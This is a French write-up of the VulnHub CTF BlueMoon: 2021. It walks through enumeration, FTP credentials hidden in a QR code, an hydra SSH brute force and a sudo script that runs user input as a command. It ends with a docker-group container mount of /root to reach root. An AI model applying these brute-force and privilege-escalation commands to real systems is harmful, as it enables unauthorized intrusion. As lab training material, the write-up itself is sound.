# Solution du CTF BlueMoon: 2021 de VulnHub

[BlueMoon: 2021](https://www.vulnhub.com/entry/bluemoon-2021,679/) est un CTF proposé sur VulnHub et créé par un certain *Kirthik*. La difficulté est notée comme facile sans plus de description. Il faut juste obtenir les droits root.

Un scan des ports de la VM (`sudo nmap -T5 -p- -sCV 192.168.56.40`) révèle trois services assez classiques. On note la présence d'un FTP qui ne semble pas ouvert aux connexions anonymes et effectivement un essai manuel retourne une erreur `530 Permission denied.`

Je suis donc passé à la phase d'énumération. Sur le site web on trouve une page de bienvenue avec deux images (une dans la page, l'autre est le favicon), rien de plus.

A l'aide de feroxbuster et des wordlists [raft](https://github.com/Averroes/raft/tree/master/data/wordlists) que j'utilise habituellement (efficaces et suffisemment courtes) j'ai tenté de trouver des fichiers et dossiers cachés en vain.

J'ai ensuite tenté de bruteforcer un éventuel compte FTP à l'aide d'hydra, toujours sans résultats.

J'ai analysé les images du site avec un éditeur hexadécimal à l'affut d'un quelconque indice.

Finalement j'ai refait une énumération web avec la wordlist plus grosse de [DirBuster](https://github.com/igorhvr/zaproxy/blob/master/src/dirbuster/directory-list-2.3-big.txt) et je suis tombé sur le fichier *hidden_text* contenant le message suivant :

> Maintanance!
> Sorry For Delay. We Will Recover Soon.
> 
> Thank You ...

La dernière ligne est un lien HTML pointant vers une image de QR code.

J'ai eu recours au site https://qrscanneronline.com/ qui a décodé l'image vers le script suivant:

```bash
#!/bin/bash

HOST=ip
USER=userftp
PASSWORD=ftpp@ssword

ftp -inv $HOST user $USER $PASSWORD
bye
EOF
```

Quand on se connecte au FTP on arrive immédiatement dans le dossier /home/userftp/files qui contient les fichiers suivants :

```
-rw-r--r--    1 0        0             147 Mar 08  2021 information.txt
-rw-r--r--    1 0        0             363 Mar 08  2021 p_lists.txt
```

Je remarque toutefois qu'il est possible de remonter l'arborescence pour aller jusqu'à la racine. A noter qu'il n'est pas possible de déposer une clé SSH dans le dossier de *userftp* ou de mettre un script php sous */var/www*.

On peut en revanche aller chercher le premier flag de l'utilisateur robin car le fichier est world readable mais on verra plus tard.

Le premier fichier contient le texte suivant :

> Hello robin ...!  
>       
>    I'm Already Told You About Your Password Weekness. I will give a Password list. you May Choose Anyone of The Password.

Le second est une liste de 32 mots de passe où des lettres ont été remplacées par des chiffres (aka leetspeak).

Une tentative de bruteforce sur le FTP échoue mais ça passe avec le SSH :

```shellsession
$ ./hydra -l robin -P /tmp/p_lists.txt ssh://192.168.56.40
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 32 login tries (l:1/p:32), ~2 tries per task
[DATA] attacking ssh://192.168.56.40:22/
[22][ssh] host: 192.168.56.40   login: robin   password: k4rv3ndh4nh4ck3r
1 of 1 target successfully completed, 1 valid password found
```

On peut alors obtenir le flag `Fl4g{u5er1r34ch3d5ucc355fully}`

Premier réflexe une fois connecté, voir si l'utilisateur peut exécuter une commande via sudo :

```shellsession
robin@BlueMoon:~$ sudo -l
Matching Defaults entries for robin on bluemoon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User robin may run the following commands on bluemoon:
    (jerry) NOPASSWD: /home/robin/project/feedback.sh
```

Le script en question n'est pas modifiable :

```
-r-xr--r-x 1 robin robin 235 Mar  8  2021 /home/robin/project/feedback.sh
```

Toutefois vu qu'on est le propriétaire on doit pouvoir changer les permissions.

On aura cependant pas à modifier le fichier puisque le script prend un nom de commande en entrée puis l'exécute :

```bash
#!/bin/bash

clear
echo -e "Script For FeedBack\n"

read -p "Enter Your Name : " name
echo ""
read -p "Enter You FeedBack About This Target Machine : " feedback
echo ""
$feedback 2>/dev/null

echo -e "\nThanks For Your FeedBack...!\n"
```

Exemple à l'exécution :

```
Script For FeedBack

Enter Your Name : toto

Enter You FeedBack About This Target Machine : id

uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)

Thanks For Your FeedBack...!
```

On saisissant `bash` comme feedback on obtient un shell peu agréable car l'output est envoyé sur /dev/null mais c'est suffisant pour déposer notre clé SSH dans le *.ssh/authorized_keys* et obtenir ensuite un vrai shell.

On a alors accès au second flag : *Fl4g{Y0ur34ch3du53r25uc355ful1y}*

On ne peux pas utiliser sudo car on ne dispose pas du mot de passe de *jerry* mais je note que l'utilisateur fait partie du groupe docker et qu'une image est présente sur le système :

```shellsession
jerry@BlueMoon:~$ id
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
jerry@BlueMoon:~$ docker images -a
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              28f6e2705743        20 months ago       5.61MB
```

Il suffit alors de lancer cette image en montant le répertoire de root à un emplacement spécifique dans le container. On aura alors accès à son contenu :

```shellsession
jerry@BlueMoon:~$ docker run -it -v /root:/real_root alpine
/ # cd real_root
/real_root # ls
root.txt
/real_root # cat root.txt

==> Congratulations <==

You Reached Root...!

Root-Flag 

     Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}

Created By 

        Kirthik - Karvendhan


instagram = ____kirthik____



!......Bye See You Again......!
```
